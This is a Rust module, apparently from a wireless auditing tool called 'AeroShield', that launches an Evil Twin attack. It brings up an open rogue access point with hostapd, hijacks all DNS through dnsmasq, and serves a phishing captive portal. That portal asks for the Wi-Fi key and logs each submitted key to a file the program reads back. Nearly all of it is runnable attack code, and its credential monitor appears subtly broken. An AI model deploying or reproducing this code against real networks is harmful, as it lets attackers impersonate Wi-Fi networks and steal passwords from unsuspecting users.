//! Evil Twin Auditing module.
//!
//! Handles creating a rogue Access Point (using `hostapd`), configuring
//! a DHCP/DNS server (using `dnsmasq`), and running a local captive portal
//! server to capture credentials.

use std::process::{Child, Command, Stdio};
use std::fs::File;
use std::io::{Write, BufRead, BufReader};
use std::sync::Mutex;
use std::thread;
use std::time::Duration;

lazy_static::lazy_static! {
    pub static ref EVIL_TWIN_STATE: Mutex<EvilTwinStatus> = Mutex::new(EvilTwinStatus::new());
    static ref EVIL_TWIN_ATTACK: Mutex<Option<EvilTwinAttack>> = Mutex::new(None);
}

#[derive(Clone, Debug)]
pub struct EvilTwinStatus {
    pub active: bool,
    pub clients: Vec<String>,
    pub credentials: Vec<String>,
}

impl EvilTwinStatus {
    fn new() -> Self {
        Self {
            active: false,
            clients: Vec::new(),
            credentials: Vec::new(),
        }
    }
}

pub struct EvilTwinConfig {
    pub interface: String,
    pub essid: String,
    pub channel: u32,
    pub portal_ip: String,
}

struct EvilTwinAttack {
    hostapd_child: Child,
    dnsmasq_child: Child,
    portal_child: Child,
    portal_log_thread_stop: std::sync::atomic::AtomicBool,
}

/// Check if required Evil Twin dependencies exist (hostapd, dnsmasq, python3)
pub fn check_dependencies() -> Vec<String> {
    let mut missing = Vec::new();
    if which::which("hostapd").is_err() {
        missing.push("hostapd".to_string());
    }
    if which::which("dnsmasq").is_err() {
        missing.push("dnsmasq".to_string());
    }
    if which::which("python3").is_err() {
        missing.push("python3".to_string());
    }
    missing
}

/// Start the Evil Twin attack by configuring and spawning hostapd, dnsmasq,
/// and the captive portal server.
pub fn start(config: &EvilTwinConfig) -> Result<(), String> {
    // 1. Ensure previous attack is stopped
    let _ = stop();

    // 2. Check dependencies
    let missing = check_dependencies();
    if !missing.is_empty() {
        return Err(format!("Missing dependencies: {}", missing.join(", ")));
    }

    // 3. Create temporary hostapd configuration
    let hostapd_conf_path = "/tmp/aeroshield_hostapd.conf";
    let mut hostapd_conf = File::create(hostapd_conf_path).map_err(|e| format!("Could not create hostapd config: {e}"))?;
    writeln!(hostapd_conf, "interface={}", config.interface).map_err(|e| e.to_string())?;
    writeln!(hostapd_conf, "driver=nl80211").map_err(|e| e.to_string())?;
    writeln!(hostapd_conf, "ssid={}", config.essid).map_err(|e| e.to_string())?;
    writeln!(hostapd_conf, "hw_mode=g").map_err(|e| e.to_string())?;
    writeln!(hostapd_conf, "channel={}", config.channel).map_err(|e| e.to_string())?;
    writeln!(hostapd_conf, "auth_algs=1").map_err(|e| e.to_string())?;
    writeln!(hostapd_conf, "wpa=0").map_err(|e| e.to_string())?; // Open network

    // 4. Set interface IP address
    let _ = Command::new("ip")
        .args(["addr", "add", &format!("{}/24", config.portal_ip), "dev", &config.interface])
        .status();

    let link_status = Command::new("ip")
        .args(["link", "set", &config.interface, "up"])
        .status()
        .map_err(|e| format!("Failed to change interface link status: {e}"))?;
    if !link_status.success() {
        return Err("Failed to set interface state to UP".to_string());
    }

    // 5. Create temporary dnsmasq configuration
    let dnsmasq_conf_path = "/tmp/aeroshield_dnsmasq.conf";
    let mut dnsmasq_conf = File::create(dnsmasq_conf_path).map_err(|e| format!("Could not create dnsmasq config: {e}"))?;
    writeln!(dnsmasq_conf, "interface={}", config.interface).map_err(|e| e.to_string())?;
    writeln!(dnsmasq_conf, "dhcp-range=192.168.1.10,192.168.1.250,12h").map_err(|e| e.to_string())?;
    writeln!(dnsmasq_conf, "dhcp-option=3,{}", config.portal_ip).map_err(|e| e.to_string())?;
    writeln!(dnsmasq_conf, "dhcp-option=6,{}", config.portal_ip).map_err(|e| e.to_string())?;
    writeln!(dnsmasq_conf, "address=/#/{}", config.portal_ip).map_err(|e| e.to_string())?; // Redirect all DNS requests

    // 6. Start hostapd
    let hostapd_child = Command::new("hostapd")
        .arg(hostapd_conf_path)
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .spawn()
        .map_err(|e| format!("Failed to spawn hostapd: {e}"))?;

    // 7. Start dnsmasq
    let dnsmasq_child = Command::new("dnsmasq")
        .args(["-C", dnsmasq_conf_path, "-d"])
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .spawn()
        .map_err(|e| format!("Failed to spawn dnsmasq: {e}"))?;

    // 8. Write a basic captive portal index page
    let portal_html_path = "/tmp/aeroshield_portal.html";
    let mut portal_html = File::create(portal_html_path).map_err(|e| format!("Could not create portal HTML: {e}"))?;
    writeln!(portal_html, "{}", r#"<!DOCTYPE html>
<html>
<head>
<title>WiFi Login</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body { font-family: sans-serif; background-color: #f7f9fa; padding: 20px; }
.card { max-width: 400px; margin: 40px auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.05); }
input[type="password"] { width: 100%; padding: 10px; margin: 10px 0 20px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
input[type="submit"] { width: 100%; padding: 10px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer; }
</style>
</head>
<body>
<div class="card">
<h2>AeroShield Security Assessment</h2>
<p>This is an authorized captive portal audit check. Please verify your network security credential below to log in.</p>
<form method="GET" action="/login">
<label>WiFi Security Key:</label>
<input type="password" name="password" required>
<input type="submit" value="Log In">
</form>
</div>
</body>
</html>"#).map_err(|e| e.to_string())?;

    // 9. Start the captive portal web server
    // Since we need to log requests/credentials, let's spawn a minimal Python script to write them to file
    let portal_script_path = "/tmp/aeroshield_portal.py";
    let mut portal_script = File::create(portal_script_path).map_err(|e| format!("Could not create portal script: {e}"))?;
    writeln!(portal_script, "{}", r#"import http.server
import socketserver
import urllib.parse

class PortalHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        if parsed.path == "/login":
            queries = urllib.parse.parse_qs(parsed.query)
            if "password" in queries:
                password = queries["password"][0]
                with open("/tmp/credentials.log", "a") as f:
                    f.write(password + "\n")
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(b"Credential received. You can now close this tab.")
        else:
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            with open("/tmp/aeroshield_portal.html", "rb") as f:
                self.wfile.write(f.read())

socketserver.TCPServer.allow_reuse_address = True
with socketserver.TCPServer(("", 80), PortalHandler) as httpd:
    httpd.serve_forever()
"#).map_err(|e| e.to_string())?;

    // Clean credentials file
    let _ = std::fs::remove_file("/tmp/credentials.log");

    let portal_child = Command::new("python3")
        .arg(portal_script_path)
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .spawn()
        .map_err(|e| format!("Failed to spawn captive portal server: {e}"))?;

    // 10. Update state
    {
        let mut state = EVIL_TWIN_STATE.lock().unwrap();
        state.active = true;
        state.clients.clear();
        state.credentials.clear();
    }

    // 11. Start log monitor thread
    thread::spawn(move || {
        log::info!("Starting captive portal credentials monitoring thread...");
        loop {
            // Check if stop was called
            if let Some(ref attack) = *EVIL_TWIN_ATTACK.lock().unwrap() {
                if attack.portal_log_thread_stop.load(std::sync::atomic::Ordering::Relaxed) {
                    break;
                }
            } else {
                break;
            }

            if let Ok(file) = File::open("/tmp/credentials.log") {
                let reader = BufReader::new(file);
                let mut creds = Vec::new();
                for line in reader.lines() {
                    if let Ok(l) = line {
                        creds.push(l);
                    }
                }
                let mut state = EVIL_TWIN_STATE.lock().unwrap();
                state.credentials = creds;
            }
            thread::sleep(Duration::from_millis(500));
        }
    });

    *EVIL_TWIN_ATTACK.lock().unwrap() = Some(EvilTwinAttack {
        hostapd_child,
        dnsmasq_child,
        portal_child,
        portal_log_thread_stop: std::sync::atomic::AtomicBool::new(false),
    });

    Ok(())
}

/// Stop the Evil Twin processes and restore interface state.
pub fn stop() -> Result<(), String> {
    let mut attack_lock = EVIL_TWIN_ATTACK.lock().unwrap();
    if let Some(mut attack) = attack_lock.take() {
        attack.portal_log_thread_stop.store(true, std::sync::atomic::Ordering::Relaxed);
        let _ = attack.hostapd_child.kill();
        let _ = attack.hostapd_child.wait();
        let _ = attack.dnsmasq_child.kill();
        let _ = attack.dnsmasq_child.wait();
        let _ = attack.portal_child.kill();
        let _ = attack.portal_child.wait();
    }

    // Clean up temporary files
    let _ = std::fs::remove_file("/tmp/aeroshield_hostapd.conf");
    let _ = std::fs::remove_file("/tmp/aeroshield_dnsmasq.conf");
    let _ = std::fs::remove_file("/tmp/aeroshield_portal.html");
    let _ = std::fs::remove_file("/tmp/aeroshield_portal.py");
    let _ = std::fs::remove_file("/tmp/credentials.log");

    let mut state = EVIL_TWIN_STATE.lock().unwrap();
    state.active = false;

    Ok(())
}
